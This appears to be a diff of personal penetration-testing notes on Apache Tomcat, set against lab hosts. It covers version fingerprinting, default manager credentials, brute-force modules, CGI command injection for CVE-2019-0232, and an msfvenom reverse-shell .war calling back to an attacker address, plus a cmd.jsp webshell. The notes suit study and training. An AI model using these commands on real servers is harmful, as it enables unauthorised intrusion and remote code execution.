@@ -24,7 +24,28 @@
         </div>
         <div class="notion-body">
             <h2>Enumeration</h2>
-            <b>Manager App section is the most important</b>
+            <ul>
+            <h3>Version identification</h3>
+            <ul>
+                <p>An easy way of identifying tomcat version is by request a page which does not exists for example</p>
+                <pre><code class="language-bash">http://app-dev.inlanefreight.local:8080/invalid</code></pre>
+                <p>This way the version number will be printed at the bottom of the page</p>
+                <p>Another way of identifying is by requesting the <b>/docs</b> page which may have been deleted by administrators or not. Here is a list of important folder to checkout if /docs is still intact</p>
+                <pre><code class="language-bash">/conf #Stores configuration files used by tomcat
+/bin #Stores scripts and binaries to start and run Tomcat Server
+/lib #Stores various JAR files needed for the correct functioning of tomcat
+/logs #Stores temporary log files
+/temp #Stores temporary log files
+/webapps #Default webroot  of Tomcat and hosts all applications
+/work #Acts as a cache and is used to store data during runtime</code></pre>
+
+                <p>The most important file is <b>WEB-INF/web.xml</b> which is know as the deployment descriptor. This stores information about the routes used by the application and the classes handling these routes. Here we can find interesting endpoints</p>
+                <p>All compild classes used by the application should be stored in the <b>WEB-INF/classes</b> folder These classes might contain important business logic as well as sensitive information</p>
+                <p>The <b>jsp</b> folder stores Jakarta Server Pages (JSP), formerly known as JavaServer Pages, which can be compared to PHP files on an Apache server.</p>
+                <p>the <b>tomcat-users.xml</b> is used to enable or disable the <b>/manager or host-manager</b> and in this file we can even find the username and password to access</p>    
+            </ul>
+
+            <h3>Manager App section is the most important</h3>
             <ul>
                 <p>Default endpoint for the manager section are <b>/manager or /host-manager</b></p>
                 <p>Attempt to try default credentials. More can be found <a class="notion-link" href="https://gist.github.com/0xRar/70aae102af56495b7be51486d363c4bd">here</a></p>
@@ -34,11 +55,62 @@
                     <li>admin : tomcat</li>
                 </ul>
             </ul>
+
+            <h3>Username brute force</h3>
+            <ul>
+                <p>Using the following metasploit module</p>
+                <pre><code class="language-bash">auxiliary/scanner/http/tomcat_mgr_login</code></pre>
+                <p>Or by using the following python script <a class="notion-link" href="https://github.com/b33lz3bub-1/Tomcat-Manager-Bruteforce">here</a></p>
+            </ul>
+
+            </ul>
             <h2>Exploitation</h2>
             <ul>
+                <h3>CGI scripts</h3>
+                <ul>
+                    <p>CGI scripts in tomcat can be found in the <b>/cgi /cgi-bin</b> folder. Those scripts normally require parameters in order of being used and normally are not very well secured. the CVE-2019-0232 is related since there was a CGI scripts that could be enabled by setting the option <b>enableCmdLineArguments</b> which lead to RCE</p>
+                    <p>Identify them by using dirb or others. Extensions type could be. Windows: <b>.cgi .bat. cmd .exe .pl .py .cgi</b> | Linux: <b>.cgi .pl .py .sh .cgi</b> </p>
+                    <p><b>IMPORTANT!!</b> it might be possible that you find out a 404 when browsing the folder but that does not mean that it not exists. Said that attempt to perform the dir brute using <b>http://IP:8080/cgi/FUZZ</b></p>
+                    <p>Once identifyed you batch or cmd file pass a parameter and check if it executes</p>
+                    <pre><code class="language-bash">http://10.129.205.30:8080/cgi/welcome.bat?&dir</code></pre>
+                    <p>In case other commands do not work it is possible that the PATH is not set so you need to specify absolute path. Check if path is set by using</p>
+                    <pre><code class="language-bash">http://10.129.205.30:8080/cgi/welcome.bat?&set</code></pre>
+                    <p>An example could be</p>
+                    <pre><code class="language-bash">http://10.129.204.227:8080/cgi/welcome.bat?&c:\windows\system32\whoami.exe</code></pre>
+                    <p>And even the case the server returns an error you should try to encode it</p>
+                    <pre><code class="language-bash">http://10.129.204.227:8080/cgi/welcome.bat?&c%3A%5Cwindows%5Csystem32%5Cwhoami.exe</code></pre>
+                </ul>
+                <h3>Uploading a webshell</h3>
                 <p>In case you are inside <b>Manager App</b> section you can try to upload a .war file with a reverse shell</p>
+                
+                <h4>Metasploit module</h4>
+                <ul>
+                    <p>To automate all the process we could use the following metasploit module</p>
+                     <pre><code class="language-bash">multi/http/tomcat_mgr_upload</code></pre>
+                </ul>
 
-                <h3>Developing a .war file (Tomcat in a Windows OS)</h3>
+                <h4>Creating a .war using msfvenom</h4>
+                <ul>
+                    <p>Use the following command in order to create a .war which will contain a rever shell</p>
+                    <pre><code class="language-bash">msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.15 LPORT=4443 -f war > backup.war</code></pre>
+                    <p>Then upload use the following metasploit module in order to catch the connection</p>
+                    <pre><code class="language-bash">use exploit/multi/handler
+set payload java/jsp_shell_reverse_tcp</code></pre>
+
+                    <p>Finally access the file through the webserver and catch the connection back to your attacking server</p>
+                </ul>
+
+                <h4>Universal .war webshell</h4>
+                <ul>
+                    <p>Download the following .jsp file <a class="notion-link" href="https://raw.githubusercontent.com/tennc/webshell/master/fuzzdb-webshell/jsp/cmd.jsp">here</a></p>
+                    <p>Archive the file into a .war</p>
+                    <pre><code class="language-bash">zip -r backup.war cmd.jsp </code></pre>
+                    <p>Then upload the that file and look for a new application called /backup. Finally perform a http request passing as a parameter the command you would like to use</p>
+                    <pre><code class="language-bash">http://web01.inlanefreight.local:8180/backup/cmd.jsp?cmd=id</code></pre>
+                </ul>
+
+
+                <h4>Developing a .war file (Tomcat in a Windows OS)</h4>
                 Create the following directory structure
 
                 <pre><code class="language-bash">ReverseShell/
